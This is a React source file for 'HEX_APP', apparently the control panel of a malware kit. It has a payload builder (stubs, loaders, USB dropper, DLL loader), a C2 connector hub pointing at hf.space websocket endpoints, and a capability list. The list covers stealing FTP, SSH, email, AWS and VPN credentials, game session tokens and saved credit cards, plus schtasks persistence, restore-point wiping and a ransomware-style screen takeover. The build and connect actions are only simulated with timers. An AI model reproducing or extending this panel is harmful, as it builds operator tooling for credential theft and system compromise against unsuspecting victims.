import React, { useState, useCallback } from 'react';
import {
  Hexagon, Shield, Activity, Database,
  Download, Settings,
  Terminal, Server, Globe,
  FileText, Key, Lock,
  CreditCard, Folder, Cloud,
  AlertTriangle, Eye, HardDrive, Monitor,
  Globe as GlobeIcon, Mail,
  Zap, Target
} from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import { toast } from 'sonner';

interface HexPayload {
  id: string;
  name: string;
  version: string;
  size: string;
  status: 'ready' | 'building' | 'error';
  type: 'stub' | 'loader' | 'dropper' | 'bind';
  lastBuilt: string;
}

interface HexConnector {
  id: string;
  name: string;
  endpoint: string;
  status: 'online' | 'offline' | 'error';
  latency: number;
  lastSync: string;
}

const SectionTitle: React.FC<{ icon: any; label: string; color?: string }> = ({ icon: Icon, label, color }) => (
  <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem', marginBottom: '1rem', borderBottom: '1px solid #222', paddingBottom: '0.6rem' }}>
    <Icon size={16} color={color || '#8b5cf6'} opacity={0.6} />
    <span style={{ fontWeight: 800, fontSize: '0.75rem', letterSpacing: '2px', color: '#888' }}>{label}</span>
  </div>
);

const HexPage: React.FC = () => {
  const [activeSection, setActiveSection] = useState<'BUILDER' | 'CONNECTORS' | 'VAULT' | 'LOGS' | 'FEATURES'>('BUILDER');
  const [payloads, setPayloads] = useState<HexPayload[]>([
    { id: '1', name: 'H-Dex-Ultra-Stub', version: '3.1.0', size: '2.4 MB', status: 'ready', type: 'stub', lastBuilt: '2026-06-07' },
    { id: '2', name: 'H-Dex-Lite-Loader', version: '2.0.0', size: '1.1 MB', status: 'ready', type: 'loader', lastBuilt: '2026-06-06' },
    { id: '3', name: 'USB-Dropper-Adv', version: '1.5.0', size: '0.8 MB', status: 'building', type: 'dropper', lastBuilt: '2026-06-05' },
  ]);
  const [connectors, setConnectors] = useState<HexConnector[]>([
    { id: 'c1', name: 'HF-Ultra-Server', endpoint: 'wss://realmrhacker-h-dex.hf.space/ws', status: 'online', latency: 32, lastSync: '1m ago' },
    { id: 'c2', name: 'A-Dex-Backend', endpoint: 'https://talhasss-adex-backend.hf.space', status: 'online', latency: 45, lastSync: '3m ago' },
    { id: 'c3', name: 'C2-Relay-Node', endpoint: 'ws://localhost:8080/ws', status: 'offline', latency: 0, lastSync: 'Never' },
  ]);
  const [logs, setLogs] = useState<{ time: string; text: string; type: string }[]>([]);
  const [selectedPayload, setSelectedPayload] = useState<HexPayload | null>(null);
  const [buildName, setBuildName] = useState('');
  const [serverUri, setServerUri] = useState('wss://realmrhacker-h-dex.hf.space/ws');
  const [buildTag, setBuildTag] = useState('HEX-NODE-01');

  const features = [
    { icon: Key, name: 'FILEZILLA_CREDS', desc: 'Extract FileZilla FTP credentials', color: '#e74c3c' },
    { icon: Key, name: 'WINSCP_CREDS', desc: 'Extract WinSCP SSH saved sessions', color: '#2ecc71' },
    { icon: Key, name: 'SSH_KEYS', desc: 'Discover private SSH keys on disk', color: '#3498db' },
    { icon: Cloud, name: 'AWS_CREDS', desc: 'Dump AWS CLI credentials', color: '#f1c40f' },
    { icon: Eye, name: 'STEAM_SESSION', desc: 'Extract Steam auth tokens', color: '#8e44ad' },
    { icon: Eye, name: 'MINECRAFT_SESSION', desc: 'Dump Minecraft launcher tokens', color: '#2ecc71' },
    { icon: Shield, name: 'FIREWALL_RULES', desc: 'List Windows firewall policies', color: '#e67e22' },
    { icon: Lock, name: 'BITLOCKER_STATUS', desc: 'Check BitLocker encryption state', color: '#1abc9c' },
    { icon: FileText, name: 'INSTALLED_CERTS', desc: 'Enumerate certificate store', color: '#9b59b6' },
    { icon: Zap, name: 'SCHEDULED_TASK', desc: 'Create persistence via schtasks', color: '#e74c3c' },
    { icon: AlertTriangle, name: 'RANSOMWARE_SIM', desc: 'Fullscreen desktop takeover', color: '#e74c3c' },
    { icon: Mail, name: 'EMAIL_CREDS', desc: 'Extract Outlook/Thunderbird creds', color: '#3498db' },
    { icon: GlobeIcon, name: 'VPN_CONFIGS', desc: 'Dump OpenVPN/WireGuard configs', color: '#1abc9c' },
    { icon: CreditCard, name: 'BROWSER_PAYMENTS', desc: 'Saved credit cards from Chrome/Edge', color: '#f1c40f' },
    { icon: HardDrive, name: 'DELETE_RESTORE', desc: 'Wipe system restore points', color: '#e74c3c' },
    { icon: Monitor, name: 'MOBAXTERM_CREDS', desc: 'Extract MobaXTerm saved sessions', color: '#8e44ad' },
    { icon: Folder, name: 'FILEZILLA_XML', desc: 'Parse FileZilla XML config files', color: '#e74c3c' },
  ];

  const addLog = useCallback((text: string, type: string = 'info') => {
    setLogs(prev => [{ time: new Date().toLocaleTimeString(), text, type }, ...prev].slice(0, 50));
  }, []);

  const triggerBuild = () => {
    if (!buildName) { toast.error('Enter a payload name'); return; }
    addLog(`Building payload: ${buildName} for ${serverUri}...`, 'cmd');
    const newPayload: HexPayload = {
      id: `p_${Date.now()}`,
      name: buildName,
      version: '1.0.0',
      size: `${(Math.random() * 3 + 0.5).toFixed(1)} MB`,
      status: 'building',
      type: 'stub',
      lastBuilt: new Date().toISOString().split('T')[0],
    };
    setPayloads(prev => [newPayload, ...prev]);
    setBuildName('');
    setTimeout(() => {
      setPayloads(prev => prev.map(p => p.id === newPayload.id ? { ...p, status: 'ready' } : p));
      addLog(`Payload ${newPayload.name} built successfully!`, 'success');
      toast.success(`${newPayload.name} ready`);
    }, 2000);
  };

  const testConnector = (conn: HexConnector) => {
    addLog(`Testing connection to ${conn.name}...`, 'cmd');
    setTimeout(() => {
      setConnectors(prev => prev.map(c => c.id === conn.id ? { ...c, status: 'online', latency: Math.floor(Math.random() * 100), lastSync: 'Just now' } : c));
      addLog(`Connection to ${conn.name} verified (${Math.floor(Math.random() * 100)}ms)`, 'success');
    }, 1500);
  };

  const exportPayload = (payload: HexPayload) => {
    addLog(`Exporting ${payload.name} (${payload.size})...`, 'cmd');
    toast.success(`${payload.name} exported`);
  };

  return (
    <div className="container" style={{ paddingTop: '1rem' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: '1rem', marginBottom: '2rem' }}>
        <Hexagon size={32} color="#8b5cf6" />
        <div>
          <h1 style={{ fontSize: '1.5rem', fontWeight: 900, letterSpacing: '4px' }}>HEX_APP</h1>
          <div style={{ fontSize: '0.65rem', color: '#666', letterSpacing: '2px' }}>PAYLOAD_BUILDER & CONNECTOR_HUB</div>
        </div>
      </div>

      <div style={{ display: 'flex', gap: '0.5rem', marginBottom: '2rem', borderBottom: '1px solid #222', paddingBottom: '1rem' }}>
        {(['BUILDER', 'CONNECTORS', 'VAULT', 'LOGS', 'FEATURES'] as const).map(s => (
          <button key={s} onClick={() => setActiveSection(s)}
            style={{
              padding: '0.6rem 1.5rem', background: activeSection === s ? 'rgba(139,92,246,0.2)' : 'transparent',
              border: activeSection === s ? '1px solid #8b5cf6' : '1px solid transparent',
              color: activeSection === s ? '#8b5cf6' : '#666', borderRadius: '8px',
              cursor: 'pointer', fontWeight: 700, fontSize: '0.7rem', letterSpacing: '1px'
            }}>
            {s === 'BUILDER' && <><Download size={14} /> BUILD</>}
            {s === 'CONNECTORS' && <><Globe size={14} /> CONNECT</>}
            {s === 'VAULT' && <><Database size={14} /> VAULT</>}
            {s === 'LOGS' && <><Terminal size={14} /> LOGS</>}
            {s === 'FEATURES' && <><Target size={14} /> FEATURES</>}
          </button>
        ))}
      </div>

      <AnimatePresence mode="wait">
        {activeSection === 'BUILDER' && (
          <motion.div key="builder" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ duration: 0.2 }}>
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1.5rem' }}>
              <div className="card" style={{ padding: '1.5rem' }}>
                <SectionTitle icon={Settings} label="BUILD_CONFIG" />
                <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                  <input value={buildName} onChange={e => setBuildName(e.target.value)} placeholder="Payload name..." style={{ background: '#0a0a0a', border: '1px solid #222', padding: '0.8rem', borderRadius: '8px', color: '#fff', fontSize: '0.85rem' }} />
                  <input value={serverUri} onChange={e => setServerUri(e.target.value)} placeholder="Server URI..." style={{ background: '#0a0a0a', border: '1px solid #222', padding: '0.8rem', borderRadius: '8px', color: '#fff', fontSize: '0.85rem' }} />
                  <input value={buildTag} onChange={e => setBuildTag(e.target.value)} placeholder="Client tag..." style={{ background: '#0a0a0a', border: '1px solid #222', padding: '0.8rem', borderRadius: '8px', color: '#fff', fontSize: '0.85rem' }} />
                  <select style={{ background: '#0a0a0a', border: '1px solid #222', padding: '0.8rem', borderRadius: '8px', color: '#fff', fontSize: '0.85rem' }}>
                    <option>H-Dex Ultra (Full)</option>
                    <option>H-Dex Lite (Minimal)</option>
                    <option>USB Dropper</option>
                    <option>DLL Loader</option>
                  </select>
                  <motion.button whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }} onClick={triggerBuild}
                    style={{ padding: '1rem', background: 'linear-gradient(135deg, #8b5cf6, #6d28d9)', border: 'none', borderRadius: '12px', color: '#fff', fontWeight: 800, fontSize: '0.85rem', cursor: 'pointer', letterSpacing: '2px' }}>
                    <Download size={16} /> BUILD_PAYLOAD
                  </motion.button>
                </div>
              </div>
              <div className="card" style={{ padding: '1.5rem' }}>
                <SectionTitle icon={FileText} label="PAYLOAD_VAULT" />
                <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem', maxHeight: '400px', overflowY: 'auto' }}>
                  {payloads.map(p => (
                    <div key={p.id} onClick={() => setSelectedPayload(p)}
                      style={{
                        padding: '0.8rem', background: '#0a0a0a', borderRadius: '8px',
                        border: selectedPayload?.id === p.id ? '1px solid #8b5cf6' : '1px solid #1a1a1a',
                        cursor: 'pointer', display: 'flex', justifyContent: 'space-between', alignItems: 'center'
                      }}>
                      <div>
                        <div style={{ fontWeight: 700, fontSize: '0.85rem' }}>{p.name}</div>
                        <div style={{ fontSize: '0.65rem', color: '#666' }}>v{p.version} | {p.size} | {p.type}</div>
                      </div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                        <span style={{
                          width: '8px', height: '8px', borderRadius: '50%',
                          background: p.status === 'ready' ? '#2ecc71' : p.status === 'building' ? '#f1c40f' : '#e74c3c'
                        }} />
                        <button onClick={(e) => { e.stopPropagation(); exportPayload(p); }}
                          style={{ background: 'none', border: '1px solid #333', borderRadius: '6px', color: '#888', padding: '0.3rem 0.6rem', cursor: 'pointer', fontSize: '0.6rem' }}>
                          EXPORT
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </motion.div>
        )}

        {activeSection === 'CONNECTORS' && (
          <motion.div key="connectors" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ duration: 0.2 }}>
            <div className="card" style={{ padding: '1.5rem' }}>
              <SectionTitle icon={Globe} label="CONNECTOR_HUB" />
              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.8rem' }}>
                {connectors.map(c => (
                  <div key={c.id} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '1rem', background: '#0a0a0a', borderRadius: '12px', border: '1px solid #1a1a1a' }}>
                    <div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                        <span style={{ width: '10px', height: '10px', borderRadius: '50%', background: c.status === 'online' ? '#2ecc71' : c.status === 'offline' ? '#666' : '#e74c3c' }} />
                        <span style={{ fontWeight: 700 }}>{c.name}</span>
                      </div>
                      <div style={{ fontSize: '0.65rem', color: '#666', marginTop: '0.3rem' }}>{c.endpoint}</div>
                      {c.status === 'online' && <div style={{ fontSize: '0.6rem', color: '#2ecc71' }}>{c.latency}ms latency | Synced {c.lastSync}</div>}
                    </div>
                    <div style={{ display: 'flex', gap: '0.5rem' }}>
                      <button onClick={() => testConnector(c)}
                        style={{ background: 'rgba(139,92,246,0.2)', border: '1px solid #8b5cf6', borderRadius: '8px', color: '#8b5cf6', padding: '0.5rem 1rem', cursor: 'pointer', fontWeight: 700, fontSize: '0.65rem' }}>
                        TEST
                      </button>
                      <button style={{ background: 'rgba(231,76,60,0.2)', border: '1px solid #e74c3c', borderRadius: '8px', color: '#e74c3c', padding: '0.5rem 1rem', cursor: 'pointer', fontWeight: 700, fontSize: '0.65rem' }}>
                        REMOVE
                      </button>
                    </div>
                  </div>
                ))}
              </div>
              <div style={{ marginTop: '1.5rem', display: 'flex', gap: '1rem' }}>
                <input placeholder="New connector endpoint..." style={{ flex: 1, background: '#0a0a0a', border: '1px solid #222', padding: '0.8rem', borderRadius: '8px', color: '#fff', fontSize: '0.85rem' }} />
                <motion.button whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}
                  style={{ padding: '0.8rem 2rem', background: '#8b5cf6', border: 'none', borderRadius: '8px', color: '#fff', fontWeight: 700, cursor: 'pointer' }}>
                  ADD
                </motion.button>
              </div>
            </div>
          </motion.div>
        )}

        {activeSection === 'VAULT' && (
          <motion.div key="vault" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ duration: 0.2 }}>
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '1rem' }}>
              {[
                { icon: Shield, label: 'TOTAL_PAYLOADS', value: payloads.length.toString(), color: '#8b5cf6' },
                { icon: Server, label: 'ACTIVE_CONNECTORS', value: connectors.filter(c => c.status === 'online').length.toString(), color: '#2ecc71' },
                { icon: Activity, label: 'BUILDS_TODAY', value: '3', color: '#f1c40f' },
              ].map((s, i) => (
                <motion.div key={s.label} initial={{ opacity: 0, y: -20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: i * 0.05 }}
                  className="card" style={{ padding: '1.2rem', display: 'flex', alignItems: 'center', gap: '1rem', borderLeft: `2px solid ${s.color}` }}>
                  <s.icon size={20} color={s.color} />
                  <div>
                    <div style={{ fontSize: '0.6rem', color: '#666', fontWeight: 'bold', letterSpacing: '1px' }}>{s.label}</div>
                    <div style={{ fontSize: '1.5rem', fontWeight: 900 }}>{s.value}</div>
                  </div>
                </motion.div>
              ))}
            </div>
            <div className="card" style={{ padding: '1.5rem', marginTop: '1.5rem' }}>
              <SectionTitle icon={Database} label="RECENT_VAULT_ACTIVITY" />
              <div style={{ fontSize: '0.8rem', color: '#666', fontFamily: 'monospace' }}>
                {payloads.map(p => (
                  <div key={p.id} style={{ padding: '0.5rem 0', borderBottom: '1px solid #111' }}>
                    [{p.lastBuilt}] {p.status === 'ready' ? 'BUILT' : 'BUILDING'} {p.name} v{p.version} ({p.size})
                  </div>
                ))}
              </div>
            </div>
          </motion.div>
        )}

        {activeSection === 'LOGS' && (
          <motion.div key="logs" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ duration: 0.2 }}>
            <div className="card" style={{ padding: '1.5rem' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
                <SectionTitle icon={Terminal} label="HEX_CORE_LOGS" />
                <button onClick={() => setLogs([])} className="btn" style={{ fontSize: '0.6rem', padding: '0.3rem 0.8rem' }}>CLEAR</button>
              </div>
              <div style={{ height: '500px', overflowY: 'auto', fontFamily: 'monospace', fontSize: '0.7rem' }}>
                {logs.length === 0 && <div style={{ color: '#333', textAlign: 'center', paddingTop: '2rem' }}>NO_LOG_ENTRIES_YET</div>}
                {logs.map((log, i) => (
                  <div key={i} style={{ padding: '0.3rem 0', borderBottom: '1px solid #0a0a0a' }}>
                    <span style={{ color: '#444' }}>[{log.time}]</span>{' '}
                    <span style={{ color: log.type === 'error' ? '#e74c3c' : log.type === 'success' ? '#2ecc71' : '#888' }}>{log.text}</span>
                  </div>
                ))}
              </div>
            </div>
          </motion.div>
        )}

        {activeSection === 'FEATURES' && (
          <motion.div key="features" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ duration: 0.2 }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.5rem' }}>
              <div>
                <div style={{ fontSize: '0.6rem', color: '#666', letterSpacing: '2px' }}>TOTAL_CAPABILITIES</div>
                <div style={{ fontSize: '2rem', fontWeight: 900 }}>{features.length}</div>
              </div>
              <div style={{ display: 'flex', gap: '0.5rem', alignItems: 'center' }}>
                {['DATA_THEFT', 'PERSISTENCE', 'DEFENSE_EVASION'].map(t => (
                  <span key={t} style={{ padding: '0.3rem 0.8rem', background: 'rgba(139,92,246,0.15)', border: '1px solid rgba(139,92,246,0.3)', borderRadius: '20px', fontSize: '0.55rem', color: '#8b5cf6', letterSpacing: '1px' }}>{t}</span>
                ))}
              </div>
            </div>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(280px, 1fr))', gap: '0.8rem' }}>
              {features.map((f, i) => (
                <motion.div key={f.name} initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: i * 0.03 }}
                  className="card" style={{ padding: '1rem', display: 'flex', alignItems: 'center', gap: '1rem', borderLeft: `3px solid ${f.color}` }}>
                  <div style={{ padding: '0.6rem', borderRadius: '8px', background: `${f.color}15`, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                    <f.icon size={18} color={f.color} />
                  </div>
                  <div>
                    <div style={{ fontWeight: 800, fontSize: '0.75rem', letterSpacing: '1px' }}>{f.name}</div>
                    <div style={{ fontSize: '0.65rem', color: '#666', marginTop: '0.2rem' }}>{f.desc}</div>
                  </div>
                </motion.div>
              ))}
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default HexPage;
